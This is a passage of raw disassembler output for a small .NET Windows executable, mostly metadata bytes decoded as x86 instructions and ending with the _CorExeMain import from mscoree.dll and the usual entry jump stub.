  40cf8b:	20 01                	and    %al,(%ecx)
  40cf8d:	13 00                	adc    (%eax),%eax
  40cf8f:	08 04 07             	or     %al,(%edi,%eax,1)
  40cf92:	01 12                	add    %edx,(%edx)
  40cf94:	60                   	pusha
  40cf95:	0e                   	push   %cs
  40cf96:	07                   	pop    %es
  40cf97:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cf9c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cfa2:	12 60 07             	adc    0x7(%eax),%ah
  40cfa5:	07                   	pop    %es
  40cfa6:	04 08                	add    $0x8,%al
  40cfa8:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cfad:	20 01                	and    %al,(%ecx)
  40cfaf:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cfb5:	64 04 00             	fs add $0x0,%al
  40cfb8:	01 0b                	add    %ecx,(%ebx)
  40cfba:	0a 04 00             	or     (%eax,%eax,1),%al
  40cfbd:	01 0b                	add    %ecx,(%ebx)
  40cfbf:	0e                   	push   %cs
  40cfc0:	04 00                	add    $0x0,%al
  40cfc2:	01 0b                	add    %ecx,(%ebx)
  40cfc4:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfc9:	0c 06                	or     $0x6,%al
  40cfcb:	00 01                	add    %al,(%ecx)
  40cfcd:	0b 11                	or     (%ecx),%edx
  40cfcf:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cfd6:	04 00 01 
  40cfd9:	0a 0e                	or     (%esi),%cl
  40cfdb:	04 00                	add    $0x0,%al
  40cfdd:	01 0a                	add    %ecx,(%edx)
  40cfdf:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40cfe4:	0c 06                	or     $0x6,%al
  40cfe6:	00 01                	add    %al,(%ecx)
  40cfe8:	0a 11                	or     (%ecx),%dl
  40cfea:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40cff1:	04 00 01 
  40cff4:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40cff9:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40cffd:	ad                   	lods   %ds:(%esi),%eax
  40cffe:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d003:	0c 07                	or     $0x7,%al
  40d005:	07                   	pop    %es
  40d006:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d00c:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d011:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d017:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d01d:	12 60 1d             	adc    0x1d(%eax),%ah
  40d020:	0e                   	push   %cs
  40d021:	0e                   	push   %cs
  40d022:	08 12                	or     %dl,(%edx)
  40d024:	60                   	pusha
  40d025:	08 05 07 01 12 81    	or     %al,0x81120107
  40d02b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d030:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d037:	05 08 08 06 00       	add    $0x60808,%eax
  40d03c:	02 07                	add    (%edi),%al
  40d03e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d043:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d04a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d050:	00 02                	add    %al,(%edx)
  40d052:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d058:	02 0b                	add    (%ebx),%cl
  40d05a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d05f:	02 06                	add    (%esi),%al
  40d061:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d066:	02 0a                	add    (%edx),%cl
  40d068:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d06d:	03 12                	add    (%edx),%edx
  40d06f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d076:	07 02 12 
  40d079:	60                   	pusha
  40d07a:	02 04 07             	add    (%edi,%eax,1),%al
  40d07d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d083:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d088:	04 1d                	add    $0x1d,%al
  40d08a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d08f:	06                   	push   %es
  40d090:	07                   	pop    %es
  40d091:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d097:	00 01                	add    %al,(%ecx)
  40d099:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d09e:	06                   	push   %es
  40d09f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d0a5:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d0ab:	05 08 20 02 01       	add    $0x1022008,%eax
  40d0b0:	12 61 11             	adc    0x11(%ecx),%ah
  40d0b3:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d0b7:	04 12                	add    $0x12,%al
  40d0b9:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d0c0:	1d 05 00 
  40d0c3:	00 ec                	add    %ch,%ah
  40d0c5:	d0 00                	rolb   $1,(%eax)
	...
  40d0cf:	00 0e                	add    %cl,(%esi)
  40d0d1:	d1 00                	roll   $1,(%eax)
  40d0d3:	00 00                	add    %al,(%eax)
  40d0d5:	20 00                	and    %al,(%eax)
	...
  40d0eb:	00 00                	add    %al,(%eax)
  40d0ed:	d1 00                	roll   $1,(%eax)
	...
  40d0ff:	00 00                	add    %al,(%eax)
  40d101:	00 5f 43             	add    %bl,0x43(%edi)
  40d104:	6f                   	outsl  %ds:(%esi),(%dx)
  40d105:	72 45                	jb     0x40d14c
  40d107:	78 65                	js     0x40d16e
  40d109:	4d                   	dec    %ebp
  40d10a:	61                   	popa
  40d10b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d112:	72 65                	jb     0x40d179
  40d114:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d118:	6c                   	insb   (%dx),%es:(%edi)
  40d119:	00 00                	add    %al,(%eax)
  40d11b:	00 00                	add    %al,(%eax)
  40d11d:	00 ff                	add    %bh,%bh
  40d11f:	25 00 20 40 00       	and    $0x402000,%eax
